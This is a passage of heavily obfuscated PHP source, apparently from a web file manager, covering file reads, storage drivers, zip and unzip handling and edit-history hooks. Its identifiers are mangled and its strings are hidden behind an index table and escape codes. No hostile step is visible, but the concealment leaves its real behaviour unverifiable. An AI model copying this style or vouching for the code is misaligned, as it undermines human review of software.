$İ†ºû[$·Ö»æ½ß[89]], $·Ö»æ½ß[1289] => rtrim($•¡£ÚÑñ, $·Ö»æ½ß[8]) . $·Ö»æ½ß[8] . $Òú¤æº¾, $·Ö»æ½ß[1290] => $İ†ºû); } $¸æÈÒ—è = array($·Ö»æ½ß[231] => $ÒêşÓ–¬, $·Ö»æ½ß[78] => $¼£Ö½Ñú); Hook::trigger($·Ö»æ½ß[1291], $ëĞ¹´‡é, $•¡£ÚÑñ, $¸æÈÒ—è); foreach ($¼£Ö½Ñú as $İ†ºû) { IO::mkdir($İ†ºû); } foreach ($ÒêşÓ–¬ as $İ†ºû) { IO::copy($İ†ºû[$·Ö»æ½ß[1288]], $İ†ºû[$·Ö»æ½ß[1289]], REPEAT_REPLACE); } } public static function fileSubstr($êšè˜ı, $íº¢Ñçê, $ËÜĞ°–ª = false) { $ÅáÏ‡Æä =& $_SERVER[öæÛ¿©¿]; $›Á·è¼ú = self::driverMake($êšè˜ı); $—éÑÖì = $›Á·è¼ú->size($êšè˜ı); $Îó´—¡½ = $íº¢Ñçê; $ûÆ¤€…ô = $ËÜĞ°–ª; if ($íº¢Ñçê < 0) { $íº¢Ñçê = $—éÑÖì + $íº¢Ñçê; } if ($ËÜĞ°–ª === !1) { $ËÜĞ°–ª = $—éÑÖì - $íº¢Ñçê; } if ($íº¢Ñçê + $ËÜĞ°–ª > $—éÑÖì) { $ËÜĞ°–ª = $—éÑÖì - $íº¢Ñçê; } if (!$—éÑÖì && $›Á·è¼ú->getType() == $ÅáÏ‡Æä[107] && !$›Á·è¼ú->exist($êšè˜ı)) { $è¨¯Í¹î = get_path_this($êšè˜ı); $›ÉÁø˜ä = parse_url_query($è¨¯Í¹î); if (is_array($›ÉÁø˜ä) && isset($›ÉÁø˜ä[$ÅáÏ‡Æä[32]])) { $è¨¯Í¹î = urldecode($›ÉÁø˜ä[$ÅáÏ‡Æä[32]]); } throw new Exception($ÅáÏ‡Æä[1292] . LNG($ÅáÏ‡Æä[1293]) . $ÅáÏ‡Æä[1078] . clear_html($è¨¯Í¹î) . $ÅáÏ‡Æä[12]); } if ($ËÜĞ°–ª <= 0) { return $ÅáÏ‡Æä[12]; } if ($íº¢Ñçê < 0 || $íº¢Ñçê >= $—éÑÖì || $ËÜĞ°–ª > $GLOBALS[$ÅáÏ‡Æä[6]][$ÅáÏ‡Æä[92]][$ÅáÏ‡Æä[1294]]) { throw new Exception("\x66\151\154\145\122\x65\141\x64\40\145\162\162\x6f\162\54\x6f\x76\x65\162\40\x69\157\x52\145\141\x64\115\141\x78\x21\40\163\x74\141\162\x74\75{$íº¢Ñçê}\x3b\154\145\156\x67\x74\150\75{$ËÜĞ°–ª}\x3b\40\x73\151\x7a\x65\x3d{$—éÑÖì}\x3b"); } $ıÃÄÜÉ‹ = $›Á·è¼ú->fileSubstr($êšè˜ı, $íº¢Ñçê, $ËÜĞ°–ª); if (!$ıÃÄÜÉ‹ && $ËÜĞ°–ª && isset($GLOBALS[$ÅáÏ‡Æä[1295]])) { throw new Exception($GLOBALS[$ÅáÏ‡Æä[1295]][$ÅáÏ‡Æä[1296]]); } return $ıÃÄÜÉ‹; } private static function driverMake(&$¬¬Ğ•ìí) { $ú£™¥¦ =& $_SERVER[öæÛ¿©¿]; $‘ìÓË¯˜ = KodIO::parse($¬¬Ğ•ìí); if (!self::$driverListSystem) { $¯Æ·À‰¥ = Model($ú£™¥¦[860])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($¯Æ·À‰¥, $ú£™¥¦[483]); } if ($‘ìÓË¯˜[$ú£™¥¦[33]] == KodIO::KOD_IO && !self::$driverListSystem[$‘ìÓË¯˜[$ú£™¥¦[483]]]) { throw new Exception($ú£™¥¦[1297]); return !1; } $¬¬Ğ•ìí = $‘ìÓË¯˜[$ú£™¥¦[1298]]; $Ú‰Öï” = self::driverGet($‘ìÓË¯˜, $¬¬Ğ•ìí); return $Ú‰Öï”; } private static function driverGet($¡åõâ¸ , &$¸Úš ì) { $¥­ó¶®€ =& $_SERVER[öæÛ¿©¿]; $¼î£âÏÃ = $¡åõâ¸ [$¥­ó¶®€[1299]]; $­Ö½Ï©ú = $¡åõâ¸ [$¥­ó¶®€[483]]; switch ($¡åõâ¸ [$¥­ó¶®€[33]]) { case KodIO::KOD_IO: $äß´©¨‘ = self::$driverListSystem[$­Ö½Ï©ú]; break; case KodIO::KOD_SOURCE: $¸Úš ì = $­Ö½Ï©ú . $¸Úš ì; $äß´©¨‘ = array($¥­ó¶®€[1300] => $¥­ó¶®€[1301], $¥­ó¶®€[6] => $¡åõâ¸ ); $äß´©¨‘[$¥­ó¶®€[6]][$¥­ó¶®€[1302]] = $¡åõâ¸ [$¥­ó¶®€[483]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $¯ş¸ÚÖÛ = $GLOBALS[$¥­ó¶®€[1303]]; self::$driverListUser = array_to_keyvalue($¯ş¸ÚÖÛ, $¥­ó¶®€[483]); } $äß´©¨‘ = self::$driverListUser[$­Ö½Ï©ú]; break; case KodIO::KOD_SHARE_LINK: $äß´©¨‘ = array($¥­ó¶®€[1300] => $¥­ó¶®€[1304], $¥­ó¶®€[6] => $¡åõâ¸ ); $ÆÎƒ®é = Action($¥­ó¶®€[1305])->sharePathInfo($¡åõâ¸ [$¥­ó¶®€[87]]); $¸Úš ì = $ÆÎƒ®é[$¥­ó¶®€[192]]; if (!$ÆÎƒ®é[$¥­ó¶®€[192]]) { $š£ÚûÒ‡ = Model($¥­ó¶®€[683])->getInfoByHash($¡åõâ¸ [$¥­ó¶®€[483]]); $¸Úš ì = KodIO::clear($š£ÚûÒ‡[$¥­ó¶®€[579]] . $¡åõâ¸ [$¥­ó¶®€[1298]]); $¡åõâ¸ [$¥­ó¶®€[572]] = $š£ÚûÒ‡; $¡åõâ¸ [$¥­ó¶®€[1279]] = $¸Úš ì; $äß´©¨‘ = array($¥­ó¶®€[1300] => $¥­ó¶®€[1306], $¥­ó¶®€[6] => $¡åõâ¸ ); } else { $äß´©¨‘[$¥­ó¶®€[6]][$¥­ó¶®€[1302]] = $ÆÎƒ®é[$¥­ó¶®€[192]]; } break; case KodIO::KOD_SHARE_ITEM: $äß´©¨‘ = array($¥­ó¶®€[1300] => $¥­ó¶®€[1307], $¥­ó¶®€[6] => $¡åõâ¸ ); $š£ÚûÒ‡ = Model($¥­ó¶®€[683])->getInfo($¡åõâ¸ [$¥­ó¶®€[483]]); if ($š£ÚûÒ‡[$¥­ó¶®€[192]] == $¥­ó¶®€[229]) { $¸Úš ì = KodIO::clear($š£ÚûÒ‡[$¥­ó¶®€[579]] . $¡åõâ¸ [$¥­ó¶®€[1298]]); $¡åõâ¸ [$¥­ó¶®€[572]] = $š£ÚûÒ‡; $¡åõâ¸ [$¥­ó¶®€[1279]] = $¸Úš ì; $äß´©¨‘ = array($¥­ó¶®€[1300] => $¥­ó¶®€[1308], $¥­ó¶®€[6] => $¡åõâ¸ ); } else { if (!$¸Úš ì) { $¸Úš ì = $š£ÚûÒ‡[$¥­ó¶®€[192]]; } $äß´©¨‘[$¥­ó¶®€[6]][$¥­ó¶®€[1302]] = $š£ÚûÒ‡[$¥­ó¶®€[192]]; } break; case KodIO::KOD_SHARE_OUTER: $äß´©¨‘ = array($¥­ó¶®€[1300] => $¥­ó¶®€[1309], $¥­ó¶®€[6] => $¡åõâ¸ ); break; default: $¸Úš ì = $¡åõâ¸ [$¥­ó¶®€[87]]; $äß´©¨‘ = array($¥­ó¶®€[1300] => $¥­ó¶®€[1310]); break; } $Ó€û›Àï = $¡åõâ¸ [$¥­ó¶®€[87]]; if (!isset(self::$driverCache[$Ó€û›Àï])) { $§ç°ôÇú = strtolower($äß´©¨‘[$¥­ó¶®€[96]]); $œ»òæÎ = $GLOBALS[$¥­ó¶®€[6]][$¥­ó¶®€[92]][$¥­ó¶®€[926]]; $ÍµÜŞ ş = $¥­ó¶®€[77] . (isset($œ»òæÎ[$§ç°ôÇú]) ? $œ»òæÎ[$§ç°ôÇú] : ucfirst($§ç°ôÇú)); if (!class_exists($ÍµÜŞ ş)) { show_json("{$ÍµÜŞ ş}\40\156\157\164\40\145\170\151\x73\x74\163\41", !1); } $…ôß‡«™ = isset($äß´©¨‘[$¥­ó¶®€[6]]) ? $äß´©¨‘[$¥­ó¶®€[6]] : !1; self::$driverCache[$Ó€û›Àï] = new $ÍµÜŞ ş($…ôß‡«™); } $æ¸œ¶Ùš = self::$driverCache[$Ó€û›Àï]; $æ¸œ¶Ùš->pathDriver = $¼î£âÏÃ; $æ¸œ¶Ùš->pathBase = $¥­ó¶®€[12]; if (isset($äß´©¨‘[$¥­ó¶®€[6]][$¥­ó¶®€[1311]])) { $æ¸œ¶Ùš->pathBase = rtrim($äß´©¨‘[$¥­ó¶®€[6]][$¥­ó¶®€[1311]], $¥­ó¶®€[8]) . $¥­ó¶®€[8]; $¸Úš ì = $æ¸œ¶Ùš->pathBase . ltrim($¸Úš ì, $¥­ó¶®€[8]); } $¸Úš ì = $æ¸œ¶Ùš->getPath($¸Úš ì); if (isset($¡åõâ¸ [$¥­ó¶®€[1279]])) { $¸Úš ì = $¡åõâ¸ [$¥­ó¶®€[1279]]; } $æ¸œ¶Ùš->path = $¸Úš ì; return $æ¸œ¶Ùš; } public static function errorTips($şèŞÂİ = false, $«²ìåöØ = true) { $Ñ³«ˆºç =& $_SERVER[öæÛ¿©¿]; static $á¼Õ¹ñ = array(); $Ï”´ŸÇ¥ = 100; if ($şèŞÂİ === -1) { return $á¼Õ¹ñ ? $á¼Õ¹ñ[count($á¼Õ¹ñ) - 1] : $Ñ³«ˆºç[12]; } if ($şèŞÂİ === !1) { return implode($Ñ³«ˆºç[286], $á¼Õ¹ñ); } if (count($á¼Õ¹ñ) >= $Ï”´ŸÇ¥) { $á¼Õ¹ñ = array_slice($á¼Õ¹ñ, $Ï”´ŸÇ¥ * 0.5, $Ï”´ŸÇ¥); } $á¼Õ¹ñ[] = $şèŞÂİ; if (!$«²ìåöØ) { return; } write_log($Ñ³«ˆºç[174] . ACTION . $Ñ³«ˆºç[1312] . $şèŞÂİ, $Ñ³«ˆºç[1313]); } public static function getLastError($Ü¥º…ÎÔ = '') { $Ùµ¦•˜‰ = self::errorTips(-1); return $Ùµ¦•˜‰ ? $Ùµ¦•˜‰ : $Ü¥º…ÎÔ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $¦êÙÀª; if ($¦êÙÀª) { return $¦êÙÀª; } $‚ï×ÚÜÏ = IO::init($_SERVER[öæÛ¿©¿][8]); return $‚ï×ÚÜÏ; } private static function iconvSystem($‹óşíÓß) { return self::local()->iconvSystem($‹óşíÓß); } private static function iconvApp($Ë½ù¢ÉË) { return self::local()->iconvApp($Ë½ù¢ÉË); } public static function zipFolder($ºĞ¿ßèŒ, $…œˆ…¶î = "\x7a\151\x70", $™®¥ÕÚ¿ = '', $«‹¯¢º = REPEAT_RENAME) { $—Íß¨ã– =& $_SERVER[öæÛ¿©¿]; $ÌÌùáë¬ = IO::listPath($ºĞ¿ßèŒ); if (!$ÌÌùáë¬) { return !1; } $ÌÌùáë¬ = array_merge($ÌÌùáë¬[$—Íß¨ã–[85]], $ÌÌùáë¬[$—Íß¨ã–[86]]); return self::zip($ÌÌùáë¬, $…œˆ…¶î, $™®¥ÕÚ¿, $«‹¯¢º); } public static function zip($¿£ëîªâ, $äƒ–†®¡ = "\x7a\151\x70", $ı¹Äí›Ô = '', $Ö°³¨©Š = REPEAT_RENAME) { $üÜ±êüï =& $_SERVER[öæÛ¿©¿]; if (is_string($¿£ëîªâ) && $¿£ëîªâ) { $¿£ëîªâ = array(array($üÜ±êüï[87] => $¿£ëîªâ)); } $·ƒÂä¸® = self::init($¿£ëîªâ[0][$üÜ±êüï[87]]); $‚Ù¦¯×“ = self::info($¿£ëîªâ[0][$üÜ±êüï[87]]); $–¥œòÔŒ = $üÜ±êüï[12]; $è´ÈŸ­” = $üÜ±êüï[12]; $š­êş›İ = $üÜ±êüï[12]; if ($ı¹Äí›Ô && substr($ı¹Äí›Ô, -1, 1) != $üÜ±êüï[8]) { $è´ÈŸ­” = get_path_father($ı¹Äí›Ô); $š­êş›İ = get_path_this($ı¹Äí›Ô); } else { $è´ÈŸ­” = self::pathFather($‚Ù¦¯×“[$üÜ±êüï[87]]); $š­êş›İ = $‚Ù¦¯×“[$üÜ±êüï[32]] . $üÜ±êüï[10] . $äƒ–†®¡; if (count($¿£ëîªâ) > 1) { $µ¨—²å“ = IO::info($è´ÈŸ­”); $š­êş›İ = $µ¨—²å“[$üÜ±êüï[32]] . $üÜ±êüï[10] . $äƒ–†®¡; } if ($ı¹Äí›Ô) { $è´ÈŸ­” = $ı¹Äí›Ô; } } if ($·ƒÂä¸®->getType() == $üÜ±êüï[107]) { $ŸÉÎ¼¬ô = self::init($è´ÈŸ­”); $Á“ñ«Û = $ŸÉÎ¼¬ô->getType() == $üÜ±êüï[107] ? $è´ÈŸ­” : get_path_father($·ƒÂä¸®->path); $Á“ñ«Û = IO::getPathInner($Á“ñ«Û); $Á“ñ«Û = rtrim($Á“ñ«Û, $üÜ±êüï[8]) . $üÜ±êüï[8]; mk_dir($Á“ñ«Û); } else { $–¥œòÔŒ = TEMP_FILES . $üÜ±êüï[1314] . time() . rand_string(8) . $üÜ±êüï[8]; mk_dir($–¥œòÔŒ); file_put_contents($–¥œòÔŒ . $üÜ±êüï[1315], $üÜ±êüï[12]); $Á“ñ«Û = $–¥œòÔŒ; } $ü…¹ğ™Ó = IO::info($Á“ñ«Û); if (!$ü…¹ğ™Ó || !$ü…¹ğ™Ó[$üÜ±êüï[234]]) { show_json(LNG($üÜ±êüï[1316]), !1); } $—ø™²Ã± = self::zipFileList($¿£ëîªâ, $–¥œòÔŒ); foreach ($—ø™²Ã± as $ñÈœíƒĞ => $úÂÉÖ½) { $—ø™²Ã±[$ñÈœíƒĞ] = self::iconvSystem($úÂÉÖ½); } $Ó³®Ì ù = get_filename_auto($Á“ñ«Û . $š­êş›İ, $üÜ±êüï[12], $Ö°³¨©Š); KodArchive::create(self::iconvSystem($Ó³®Ì ù), $—ø™²Ã±); if (!IO::exist($Ó³®Ì ù)) { if ($–¥œòÔŒ) { del_dir($–¥œòÔŒ); } write_log($üÜ±êüï[1317] . $Ó³®Ì ù, $üÜ±êüï[389]); show_json(LNG($üÜ±êüï[1318]), !1); } if (!$–¥œòÔŒ) { return $Ó³®Ì ù; } $í¸Ÿ’à¡ = self::move($Ó³®Ì ù, $è´ÈŸ­”, $Ö°³¨©Š); if ($–¥œòÔŒ) { del_dir($–¥œòÔŒ); } if (!$Ó³®Ì ù) { write_log($üÜ±êüï[1319] . $Ó³®Ì ù . $üÜ±êüï[1320] . $è´ÈŸ­”, $üÜ±êüï[389]); show_json(LNG($üÜ±êüï[1318]), !1); } return $í¸Ÿ’à¡; } public static function unzip($¡â„¶ñÊ, $é‡˜ğ , $’‚ßãÂ‡ = "\55\x31", $÷–‚š = "\x72\145\160\x6c\141\x63\x65") { $ŞÅó»õ =& $_SERVER[öæÛ¿©¿]; $·š§ö‰ğ = parent::info($¡â„¶ñÊ); if (!$·š§ö‰ğ) { show_json(LNG($ŞÅó»õ[1321]), !1); } $ğÇÆ¨ = IO::infoFullSimple($é‡˜ğ ); if (!$ğÇÆ¨) { $é‡˜ğ  = IO::mkdir($é‡˜ğ ); } if (isset($ğÇÆ¨[$ŞÅó»õ[192]]) && trim($ğÇÆ¨[$ŞÅó»õ[87]], $ŞÅó»õ[8]) != trim($é‡˜ğ , $ŞÅó»õ[8])) { $ÅòÆ¡ º = KodIO::make($ğÇÆ¨[$ŞÅó»õ[191]]); $ıû©Ò£· = IO::fileNameAuto($ÅòÆ¡ º, $ğÇÆ¨[$ŞÅó»õ[32]], REPEAT_RENAME_FOLDER, !0); $é‡˜ğ  = IO::mkdir($ÅòÆ¡ º . $ıû©Ò£·); } $’‚ßãÂ‡ = $’‚ßãÂ‡ && $’‚ßãÂ‡ != $ŞÅó»õ[1322] ? @json_decode($’‚ßãÂ‡, !0) : -1; $…Ğ´â¹¾ = self::unzipPart($¡â„¶ñÊ, $’‚ßãÂ‡); if (!$…Ğ´â¹¾ || !IO::exist($…Ğ´â¹¾[$ŞÅó»õ[231]])) { show_json(LNG($ŞÅó»õ[106]), !1); } $´üİ„ˆ± = $…Ğ´â¹¾[$ŞÅó»õ[1323]][count($…Ğ´â¹¾[$ŞÅó»õ[1323]]) - 1]; if ($´üİ„ˆ±[$ŞÅó»õ[1251]] == -1 || substr($´üİ„ˆ±[$ŞÅó»õ[32]], -1, 1) == $ŞÅó»õ[8]) { $ì™Ú°ç = $…Ğ´â¹¾[$ŞÅó»õ[1324]] . rand_string(10) . $ŞÅó»õ[8]; mk_dir($ì™Ú°ç); $ä¨ıÌ¡ = count($…Ğ´â¹¾[$ŞÅó»õ[1323]]) == 1 ? IO::ext($¡â„¶ñÊ) : get_path_ext($…Ğ´â¹¾[$ŞÅó»õ[231]]); $ÕâÅõû„ = KodArchive::extract(self::iconvSystem($…Ğ´â¹¾[$ŞÅó»õ[231]]), $ì™Ú°ç, $´üİ„ˆ±[$ŞÅó»õ[1251]], $ıû©Ò£·, $ä¨ıÌ¡); self::unzipErrorCheck($ÕâÅõû„, array($ŞÅó»õ[1325], $¡â„¶ñÊ, $ä¨ıÌ¡, $é‡˜ğ , $…Ğ´â¹¾)); Hook::trigger($ŞÅó»õ[1326], $ì™Ú°ç); recursion_dir($ì™Ú°ç, $×óÛÓÈ, $¼™°Åˆ¼, 0); $Î³£‹ = array_merge($×óÛÓÈ, $¼™°Åˆ¼); $¿Ş¨¡™ = array(); foreach ($Î³£‹ as $æÌõÏç™) { $¦ÉˆÖø­ = IO::move(self::iconvApp($æÌõÏç™), $é‡˜ğ , $÷–‚š); if ($¦ÉˆÖø­) { $¿Ş¨¡™[] = $¦ÉˆÖø­; } } del_dir($ì™Ú°ç); } else { $¦ÉˆÖø­ = IO::move($…Ğ´â¹¾[$ŞÅó»õ[231]], $é‡˜ğ , $÷–‚š, get_path_this($´üİ„ˆ±[$ŞÅó»õ[32]])); if ($¦ÉˆÖø­) { $¿Ş¨¡™[] = $¦ÉˆÖø­; } } return $¿Ş¨¡™ ? $¿Ş¨¡™ : !1; } public static function unzipList($ò‹¾œ…) { $æ¿ñ˜×ë =& $_SERVER[öæÛ¿©¿]; $öñ²Ïü« = isset($ò‹¾œ…[$æ¿ñ˜×ë[1327]]) ? $ò‹¾œ…[$æ¿ñ˜×ë[1327]] : !1; $–ì‹ùé = isset($ò‹¾œ…[$æ¿ñ˜×ë[1251]]) ? @json_decode($ò‹¾œ…[$æ¿ñ˜×ë[1251]], !0) : -1; $…‹ššò = self::unzipPart($ò‹¾œ…[$æ¿ñ˜×ë[87]], $–ì‹ùé); if (!$…‹ššò || !IO::exist($…‹ššò[$æ¿ñ˜×ë[231]])) { show_json(LNG($æ¿ñ˜×ë[106]), !1); } $«¹ÃÎÆ = $…‹ššò[$æ¿ñ˜×ë[1323]][count($…‹ššò[$æ¿ñ˜×ë[1323]]) - 1]; $™ªãøò = in_array(IO::ext($…‹ššò[$æ¿ñ˜×ë[231]]), array($æ¿ñ˜×ë[389], $æ¿ñ˜×ë[1328], $æ¿ñ˜×ë[1329], $æ¿ñ˜×ë[1330], $æ¿ñ˜×ë[1331], $æ¿ñ˜×ë[1332])); if (!$öñ²Ïü« && ($«¹ÃÎÆ[$æ¿ñ˜×ë[1251]] == -1 || $™ªãøò)) { $‰µ–Üä = $…‹ššò[$æ¿ñ˜×ë[1324]] . get_path_this($…‹ššò[$æ¿ñ˜×ë[231]]) . $æ¿ñ˜×ë[1333]; if (!IO::exist($‰µ–Üä)) { $ã¶‘ª¹ = $«¹ÃÎÆ[$æ¿ñ˜×ë[1251]] == -1 ? get_path_ext(IO::pathThis($ò‹¾œ…[$æ¿ñ˜×ë[87]])) : get_path_ext($…‹ššò[$æ¿ñ˜×ë[231]]); $¨š¼¨¥º = KodArchive::listContent(self::iconvSystem($…‹ššò[$æ¿ñ˜×ë[231]]), !0, $ã¶‘ª¹); self::unzipErrorCheck($¨š¼¨¥º, array($æ¿ñ˜×ë[1334], $ò‹¾œ…, $…‹ššò)); @file_put_contents($‰µ–Üä, json_encode($¨š¼¨¥º[$æ¿ñ˜×ë[1335]])); } return @json_decode(IO::getContent($‰µ–Üä), !0); } IO::fileOut($…‹ššò[$æ¿ñ˜×ë[231]], $öñ²Ïü«, get_path_this($«¹ÃÎÆ[$æ¿ñ˜×ë[32]])); die; } private static function zipFileList($¾¦ÍÑÛş, $ÙÁşî±ê = false) { $äÈıç†¥ =& $_SERVER[öæÛ¿©¿]; $ÇÑ¯¥¹ = array(); foreach ($¾¦ÍÑÛş as $˜ç³) { $ÇŸ¦èüÀ = $˜ç³[$äÈıç†¥[87]]; if ($ÙÁşî±ê) { $ÇŸ¦èüÀ = self::copy($˜ç³[$äÈıç†¥[87]], $ÙÁşî±ê, $äÈıç†¥[919]); } else { $ç¬º‘© = self::init($˜ç³[$äÈıç†¥[87]]); if ($ç¬º‘©->getType() == $äÈıç†¥[107]) { $ÇŸ¦èüÀ = $ç¬º‘©->path; } } if ($ÇŸ¦èüÀ && self::local()->exist($ÇŸ¦èüÀ)) { $ÇÑ¯¥¹[$˜ç³[$äÈıç†¥[87]]] = $ÇŸ¦èüÀ; } } if (!empty($ÇÑ¯¥¹)) { return array_values($ÇÑ¯¥¹); } show_json(LNG($äÈıç†¥[1293]), !1); } private static function localFilePath($˜‡°ËÉú) { $“ø¡‰€ =& $_SERVER[öæÛ¿©¿]; $ÆŒâ¯ñ¾ = KodIO::parse($˜‡°ËÉú); if ($ÆŒâ¯ñ¾[$“ø¡‰€[33]] == KodIO::KOD_SOURCE) { $åîüÖ” = Model($“ø¡‰€[925])->fileInfoGet(KodIO::sourceID($˜‡°ËÉú)); if (!$åîüÖ”[$“ø¡‰€[87]]) { show_json($“ø¡‰€[1336], !1); } $˜‡°ËÉú = $åîüÖ”[$“ø¡‰€[87]]; } $È›¥ÕÂÂ = self::init($˜‡°ËÉú); if ($È›¥ÕÂÂ->pathParse[$“ø¡‰€[1279]]) { $˜‡°ËÉú = $È›¥ÕÂÂ->pathParse[$“ø¡‰€[1279]]; $È›¥ÕÂÂ = self::init($˜‡°ËÉú); } $ŸÑû³Ëª = $È›¥ÕÂÂ->getType(); if ($ŸÑû³Ëª == $“ø¡‰€[107] || $ŸÑû³Ëª == $“ø¡‰€[1337]) { if (!$È›¥ÕÂÂ->exist($È›¥ÕÂÂ->path)) { show_json(LNG($“ø¡‰€[106]), !1); } return $È›¥ÕÂÂ->path; } return !1; } public static function unzipPart($…×£¶Ú, $Éåæ‡»… = -1) { $×¹©ĞÅß =& $_SERVER[öæÛ¿©¿]; $®ï´¼š“ = IO::pathThis($…×£¶Ú); if (!$Éåæ‡»… || $Éåæ‡»… == -1) { $“‚Á½µã = array(array($×¹©ĞÅß[32] => $®ï´¼š“, $×¹©ĞÅß[1251] => -1)); $“‚Á½µã[0][$×¹©ĞÅß[1338]] = $“‚Á½µã[0][$×¹©ĞÅß[32]]; } else { if (is_array($Éåæ‡»…)) { $“‚Á½µã = $Éåæ‡»…; $®Í¯ø„‚ = count($“‚Á½µã) - 1; for ($Ô¨º“Óš = 0; $Ô¨º“Óš <= $®Í¯ø„‚; $Ô¨º“Óš++) { $ØÕÂáÛ = $“‚Á½µã[$Ô¨º“Óš]; $Ïø¼ ¾Ï = get_path_this($ØÕÂáÛ[$×¹©ĞÅß[32]]) . (checkExtSafe($ØÕÂáÛ[$×¹©ĞÅß[32]]) ? $×¹©ĞÅß[12] : $×¹©ĞÅß[1339]); $“‚Á½µã[$Ô¨º“Óš][$×¹©ĞÅß[1338]] = $×¹©ĞÅß[1340] . intval($ØÕÂáÛ[$×¹©ĞÅß[1251]]) . $×¹©ĞÅß[473] . $Ïø¼ ¾Ï; if ($Ô¨º“Óš == 0) { continue; } $“‚Á½µã[$Ô¨º“Óš][$×¹©ĞÅß[1338]] = $“‚Á½µã[$Ô¨º“Óš - 1][$×¹©ĞÅß[1338]] . $×¹©ĞÅß[1341] . $“‚Á½µã[$Ô¨º“Óš][$×¹©ĞÅß[1338]]; } } } if (!is_array($“‚Á½µã) || count($“‚Á½µã) == 0) { return !1; } $éæÔ—› = $“‚Á½µã[count($“‚Á½µã) - 1]; if (!IO::exist($…×£¶Ú)) { return !1; } $”ÙËƒ™Å = TEMP_FILES . $×¹©ĞÅß[1342] . kodIO::hashPathSafe($…×£¶Ú) . $×¹©ĞÅß[8]; $™ş«ìâ = $”ÙËƒ™Å . $éæÔ—›[$×¹©ĞÅß[1338]]; mk_dir($”ÙËƒ™Å); file_put_contents(TEMP_FILES . $×¹©ĞÅß[1315], $×¹©ĞÅß[12]); if (IO::exist($™ş«ìâ)) { return array($×¹©ĞÅß[231] => $™ş«ìâ, $×¹©ĞÅß[1323] => $“‚Á½µã, $×¹©ĞÅß[1324] => $”ÙËƒ™Å); } $ü½Œ”Ç„ = self::localFilePath($…×£¶Ú); if (!$ü½Œ”Ç„) { $ü½Œ”Ç„ = $”ÙËƒ™Å . $×¹©ĞÅß[1343]; if (!IO::exist($ü½Œ”Ç„)) { self::copy($…×£¶Ú, $”ÙËƒ™Å, !1, get_path_this($ü½Œ”Ç„)); } } if (!$ü½Œ”Ç„ || !IO::exist($ü½Œ”Ç„)) { return !1; } if ($éæÔ—›[$×¹©ĞÅß[1251]] == -1) { return array($×¹©ĞÅß[231] => $ü½Œ”Ç„, $×¹©ĞÅß[1323] => $“‚Á½µã, $×¹©ĞÅß[1324] => $”ÙËƒ™Å); } $Ïù³˜‹Ë = $ü½Œ”Ç„; foreach ($“‚Á½µã as $Ô¨º“Óš => $ØÕÂáÛ) { if (!$ØÕÂáÛ || $ØÕÂáÛ[$×¹©ĞÅß[1251]] == $×¹©ĞÅß[1322]) { break; } if (substr($ØÕÂáÛ[$×¹©ĞÅß[32]], -1, 1) == $×¹©ĞÅß[8]) { break; } $—·‘«¸— = in_array(get_path_ext($ØÕÂáÛ[$×¹©ĞÅß[1338]]), array($×¹©ĞÅß[389], $×¹©ĞÅß[1328], $×¹©ĞÅß[1329], $×¹©ĞÅß[1330], $×¹©ĞÅß[1331], $×¹©ĞÅß[1332])); $æ£‰¹ = $Ô¨º“Óš == count($“‚Á½µã) - 1 && $—·‘«¸—; $ğ¶ÍËüø = $”ÙËƒ™Å . $ØÕÂáÛ[$×¹©ĞÅß[1338]]; $ŒøÅæ¼ë = $”ÙËƒ™Å . get_path_this($ØÕÂáÛ[$×¹©ĞÅß[32]]); if (IO::exist($ğ¶ÍËüø)) { $Ïù³˜‹Ë = $ğ¶ÍËüø; continue; } $«³ÌÊ›¾ = $Ô¨º“Óš == 0 ? get_path_ext($®ï´¼š“) : get_path_ext($Ïù³˜‹Ë); $ğàÄò˜ = KodArchive::extract(self::iconvSystem($Ïù³˜‹Ë), $”ÙËƒ™Å, $ØÕÂáÛ[$×¹©ĞÅß[1251]], $ì¶öúá, $«³ÌÊ›¾); self::unzipErrorCheck($ğàÄò˜, array($×¹©ĞÅß[1344], $…×£¶Ú, $“‚Á½µã, $ØÕÂáÛ, $ğ¶ÍËüø)); if (IO::exist($ŒøÅæ¼ë)) { IO::rename($ŒøÅæ¼ë, get_path_this($ğ¶ÍËüø)); } $Ïù³˜‹Ë = $ğ¶ÍËüø; } $™ş«ìâ = $Ïù³˜‹Ë; return array($×¹©ĞÅß[231] => $Ïù³˜‹Ë, $×¹©ĞÅß[1323] => $“‚Á½µã, $×¹©ĞÅß[1324] => $”ÙËƒ™Å); } private static function unzipErrorCheck($èÊÖÏáö, $õ´æÜªì = false) { $Á¹ËèÙ™ =& $_SERVER[öæÛ¿©¿]; if ($èÊÖÏáö[$Á¹ËèÙ™[1345]]) { return !0; } write_log(array($Á¹ËèÙ™[1346], $èÊÖÏáö, $õ´æÜªì), $Á¹ËèÙ™[1347]); $ˆ©ûêñ = is_array($èÊÖÏáö[$Á¹ËèÙ™[1335]]) ? json_encode($èÊÖÏáö[$Á¹ËèÙ™[1335]]) : $èÊÖÏáö[$Á¹ËèÙ™[1335]]; show_json($Á¹ËèÙ™[1348] . $ˆ©ûêñ, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ä›Ç²ç =& $_SERVER[öæÛ¿©¿]; $Ø¾›ØÃ = $GLOBALS[$ä›Ç²ç[6]][$ä›Ç²ç[92]]; if ($Ø¾›ØÃ[$ä›Ç²ç[1349]] != 1) { return; } if ($Ø¾›ØÃ[$ä›Ç²ç[1350]] <= 0) { return; } if (isset($_REQUEST[$ä›Ç²ç[1351]]) && $_REQUEST[$ä›Ç²ç[1351]] == $ä›Ç²ç[91]) { return; } Hook::bind($ä›Ç²ç[1352], $ä›Ç²ç[1353]); Hook::bind($ä›Ç²ç[1354], $ä›Ç²ç[1355]); Hook::bind($ä›Ç²ç[1356], $ä›Ç²ç[1357]); Hook::bind($ä›Ç²ç[1358], $ä›Ç²ç[1359]); Hook::bind($ä›Ç²ç[1360], $ä›Ç²ç[1361]); Hook::bind($ä›Ç²ç[1362], $ä›Ç²ç[1363]); } public static function eventBeforeUpload($Å£†”ÛË) { if ($Å£†”ÛË[3] && $Å£†”ÛË[3] != REPEAT_REPLACE) { return; } $éÇ„Úš = self::parsePath($Å£†”ÛË[0]); if (!$éÇ„Úš) { return; } self::add($éÇ„Úš); } public static function eventBeforeEdit($»›Â¹í) { $‘øó­ó = self::parsePath($»›Â¹í[0]); if (!$‘øó­ó) { return; } self::add($‘øó­ó); } public static function eventBeforeCopyFile($‚òÄÔš°, $ä—±Æ…, 